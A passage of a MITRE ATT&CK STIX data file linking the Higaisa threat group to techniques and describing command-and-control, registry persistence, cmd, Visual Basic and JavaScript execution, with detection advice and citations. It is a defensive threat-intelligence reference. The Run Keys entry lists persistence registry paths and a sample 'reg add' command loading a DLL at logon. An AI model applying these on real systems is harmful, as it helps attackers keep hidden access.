            "target_ref": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
            "modified": "2021-03-05T18:54:56.747Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.747Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                },
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--cf60408f-5101-4cdf-935f-c5436071d6d0",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) named a shellcode loader binary <code>svchast.exe</code> to spoof the legitimate <code>svchost.exe</code>.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020) ",
            "target_ref": "attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c",
            "modified": "2021-04-05T19:18:23.880Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.653Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                },
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--d374ab1b-4ff8-4ee8-92d2-466581cf58c8",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) used <code>ipconfig</code> to gather network configuration information.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
            "modified": "2021-03-05T18:54:56.534Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.534Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                },
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--da2585bf-f31d-42c9-b488-e6cbab7bcd42",
            "description": "(Citation: Malwarebytes Higaisa 2020)",
            "target_ref": "malware--88c621a7-aef9-4ae0-94e3-1fc87123eb24",
            "modified": "2021-03-05T18:54:56.759Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.759Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--db2e5a57-1854-4925-9b78-422c9b79c130",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) used <code>cmd.exe</code> for execution.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)(Citation: PTSecurity Higaisa 2020)",
            "target_ref": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
            "modified": "2021-03-05T18:54:56.741Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.741Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                },
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                },
                {
                    "url": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/",
                    "description": "PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021.",
                    "source_name": "PTSecurity Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--fa22812f-01a4-420a-be11-7cb5822026e5",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
            "modified": "2021-03-05T18:54:56.644Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.644Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                },
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2020-03-26T20:15:35.821Z",
            "name": "Web Protocols",
            "x_mitre_data_sources": [
                "Network Traffic: Network Traffic Flow",
                "Network Traffic: Network Traffic Content"
            ],
            "x_mitre_version": "1.0",
            "created": "2020-03-15T16:13:46.151Z",
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
            "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "command-and-control"
                }
            ],
            "x_mitre_detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for web traffic to/from known-bad or suspicious domains. ",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1071/001",
                    "external_id": "T1071.001",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "University of Birmingham C2",
                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-01-06T18:36:29.226Z",
            "name": "Registry Run Keys / Startup Folder",
            "x_mitre_data_sources": [
                "Windows Registry: Windows Registry Key Creation",
                "Windows Registry: Windows Registry Key Modification",
                "File: File Modification",
                "Command: Command Execution",
                "Process: Process Creation"
            ],
            "x_mitre_version": "1.1",
            "created": "2020-01-23T22:02:48.566Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "persistence"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "privilege-escalation"
                }
            ],
            "x_mitre_permissions_required": [
                "Administrator",
                "User"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
            "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_contributors": [
                "Oddvar Moe, @oddvarmoe"
            ],
            "x_mitre_detection": "Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1547/001",
                    "external_id": "T1547.001",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/270.html",
                    "external_id": "CAPEC-270",
                    "source_name": "capec"
                },
                {
                    "source_name": "Microsoft Run Key",
                    "description": "Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.",
                    "url": "http://msdn.microsoft.com/en-us/library/aa376977"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry",
                    "description": "Microsoft. (2018, May 31). 32-bit and 64-bit Application Data in the Registry. Retrieved August 3, 2020.",
                    "source_name": "Microsoft Wow6432Node 2018"
                },
                {
                    "url": "https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/",
                    "description": "Arntz, P. (2016, March 30). Hiding in Plain Sight. Retrieved August 3, 2020.",
                    "source_name": "Malwarebytes Wow6432Node 2016"
                },
                {
                    "source_name": "Microsoft RunOnceEx APR 2018",
                    "description": "Microsoft. (2018, August 20). Description of the RunOnceEx Registry Key. Retrieved June 29, 2018.",
                    "url": "https://support.microsoft.com/help/310593/description-of-the-runonceex-registry-key"
                },
                {
                    "source_name": "Oddvar Moe RunOnceEx Mar 2018",
                    "description": "Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018.",
                    "url": "https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/"
                },
                {
                    "source_name": "TechNet Autoruns",
                    "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
                    "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-07-26T17:13:07.345Z",
            "name": "Windows Command Shell",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "Process: Process Creation"
            ],
            "x_mitre_version": "1.2",
            "created": "2020-03-09T14:12:31.196Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                }
            ],
            "x_mitre_permissions_required": [
                "User"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
            "description": "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_remote_support": true,
            "x_mitre_detection": "Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1059/003",
                    "external_id": "T1059.003",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/windows/terminal/tutorials/ssh",
                    "description": "Microsoft. (2020, May 19). Tutorial: SSH in Windows Terminal. Retrieved July 26, 2021.",
                    "source_name": "SSH in Windows"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-08-16T21:03:21.051Z",
            "name": "Visual Basic",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "Process: Process Creation",
                "Module: Module Load",
                "Script: Script Execution"
            ],
            "x_mitre_version": "1.2",
            "created": "2020-03-09T14:29:51.508Z",
            "x_mitre_permissions_required": [
                "User",
                "Administrator",
                "SYSTEM"
            ],
            "x_mitre_platforms": [
                "Windows",
                "macOS",
                "Linux"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
            "description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads.",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                }
            ],
            "x_mitre_detection": "Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1059/005",
                    "external_id": "T1059.005",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/",
                    "description": ".NET Team. (2020, March 11). Visual Basic support planned for .NET 5.0. Retrieved June 23, 2020.",
                    "source_name": "VB .NET Mar 2020"
                },
                {
                    "url": "https://docs.microsoft.com/dotnet/visual-basic/",
                    "description": "Microsoft. (n.d.). Visual Basic documentation. Retrieved June 23, 2020.",
                    "source_name": "VB Microsoft"
                },
                {
                    "url": "https://docs.microsoft.com/office/vba/api/overview/",
                    "description": "Microsoft. (2019, June 11). Office VBA Reference. Retrieved June 23, 2020.",
                    "source_name": "Microsoft VBA"
                },
                {
                    "url": "https://en.wikipedia.org/wiki/Visual_Basic_for_Applications",
                    "description": "Wikipedia. (n.d.). Visual Basic for Applications. Retrieved August 13, 2020.",
                    "source_name": "Wikipedia VBA"
                },
                {
                    "url": "https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)",
                    "description": "Microsoft. (2011, April 19). What Is VBScript?. Retrieved March 28, 2020.",
                    "source_name": "Microsoft VBScript"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-08-16T21:02:05.142Z",
            "name": "JavaScript",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "Process: Process Creation",
                "Module: Module Load",
                "Script: Script Execution"
            ],
            "x_mitre_version": "2.1",
            "created": "2020-06-23T19:12:24.924Z",
            "x_mitre_contributors": [
                "Cody Thomas, SpecterOps"
            ],
            "x_mitre_permissions_required": [
                "User",
                "Administrator",
                "SYSTEM"
            ],
            "x_mitre_platforms": [
                "Windows",
                "macOS",
                "Linux"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
            "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                }
            ],
            "x_mitre_detection": "Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nMonitor for execution of JXA through <code>osascript</code> and usage of <code>OSAScript</code> API that may be related to other suspicious behavior occurring on the system.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1059/007",
                    "external_id": "T1059.007",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://nodejs.org/",
                    "description": "OpenJS Foundation. (n.d.). Node.js. Retrieved June 23, 2020.",
                    "source_name": "NodeJS"
                },
                {
                    "url": "https://docs.microsoft.com/windows/win32/com/translating-to-jscript",
                    "description": "Microsoft. (2018, May 31). Translating to JScript. Retrieved June 23, 2020.",
                    "source_name": "JScrip May 2018"
                },
                {
                    "url": "https://docs.microsoft.com/archive/blogs/gauravseth/the-world-of-jscript-javascript-ecmascript",
                    "description": "Microsoft. (2007, August 15). The World of JScript, JavaScript, ECMAScript \u2026. Retrieved June 23, 2020.",
                    "source_name": "Microsoft JScript 2007"
                },
                {
                    "url": "https://docs.microsoft.com/scripting/winscript/windows-script-interfaces",
                    "description": "Microsoft. (2017, January 18). Windows Script Interfaces. Retrieved June 23, 2020.",
                    "source_name": "Microsoft Windows Scripts"
                },
                {
                    "url": "https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/index.html",
                    "description": "Apple. (2016, June 13). About Mac Scripting. Retrieved April 14, 2021.",
                    "source_name": "Apple About Mac Scripting 2016"
                },
                {
                    "url": "https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5",
                    "description": "Pitt, L. (2020, August 6). Persistent JXA. Retrieved April 14, 2021.",
                    "source_name": "SpecterOps JXA 2020"
                },
                {
                    "url": "https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/",
                    "description": "Phil Stokes. (2019, December 5). macOS Red Team: Calling Apple APIs Without Building Binaries. Retrieved July 17, 2020.",
                    "source_name": "SentinelOne macOS Red Team"
                },
                {
                    "url": "https://redcanary.com/blog/clipping-silver-sparrows-wings/",
                    "description": "Tony Lambert. (2021, February 18). Clipping Silver Sparrow\u2019s wings: Outing macOS malware before it takes flight. Retrieved April 20, 2021.",
                    "source_name": "Red Canary Silver Sparrow Feb2021"
                },
                {
                    "url": "https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/",
                    "description": "Dominic Chell. (2021, January 1). macOS Post-Exploitation Shenanigans with VSCode Extensions. Retrieved April 20, 2021.",
                    "source_name": "MDSec macOS JXA and VSCode"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2020-03-15T00:40:27.503Z",
            "name": "Protocol Impersonation",
            "x_mitre_data_sources": [
                "Network Traffic: Network Traffic Content"
            ],
